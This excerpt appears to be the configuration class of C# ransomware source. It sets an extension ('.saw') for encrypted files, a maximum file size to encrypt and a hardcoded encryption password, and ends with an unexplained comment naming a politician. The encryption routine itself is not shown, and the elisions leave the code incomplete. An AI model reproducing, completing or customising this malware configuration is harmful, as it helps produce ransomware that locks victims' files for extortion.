...
namespace Main
{
    internal static class Config
    {
        ...
        internal const string EncryptionFileExtension = @".saw";

        // Maximum filesize that is going to be encrypted in bytes
        // Default is 10MB, probably anything works
        internal const int MaxFilesizeToEncryptInBytes = 20000000;
         ...
         */
        internal const string EncryptionPassword = @"1231231231231231231237==";
        //LULADASILVA
